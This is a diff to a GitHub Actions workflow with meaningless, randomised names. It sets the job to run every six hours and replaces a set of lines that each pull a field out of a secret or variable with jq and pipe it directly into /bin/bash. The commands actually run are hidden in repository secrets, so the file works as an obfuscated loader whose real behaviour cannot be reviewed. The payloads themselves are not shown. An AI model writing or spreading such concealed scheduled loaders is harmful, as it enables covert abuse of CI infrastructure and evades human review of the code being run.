@@ -3,24 +3,25 @@ name: mnajx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 1/6 * * *'
-jobs:  # 10799
+    - cron: '3 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: mnajx
         env:
-          ciy2: ${{ secrets.ciy2 }}
+          wsatz26772: ${{ secrets.wsatz26772 }}
         run: |
-          echo $ciy2 | jq -r .wlfx3 | /bin/bash
-          echo $id67 | jq -r .wu4878 | /bin/bash
-          echo $ig03 | jq -r .jjcco2 | /bin/bash
-          echo $gqwik82825 | jq -r .p67553 | /bin/bash
-          echo $t910 | jq -r .onnm8992 | /bin/bash
-          echo $u1 | jq -r .jtdg347 | /bin/bash
-          echo $eb84 | jq -r .u8824 | /bin/bash
-          echo $sdqop7 | jq -r .vqrcs62 | /bin/bash
-          echo $w5212 | jq -r .bbjn485 | /bin/bash
+          echo $wsatz26772 | jq -r .n24151 | /bin/bash
+          echo $qy07 | jq -r .szyq84432 | /bin/bash
+          echo $v7573 | jq -r .u2 | /bin/bash
+          echo $yd4 | jq -r .jvl178 | /bin/bash
+          echo $snm1 | jq -r .ox6894 | /bin/bash
+          echo $nfvwp57 | jq -r .mo947 | /bin/bash
+          echo $jo331 | jq -r .lz5 | /bin/bash
+          echo $ex386 | jq -r .wxzry6 | /bin/bash
+          echo $ib0 | jq -r .btvme9 | /bin/bash
+          echo $pfsmj4632 | jq -r .yoy585 | /bin/bash
 
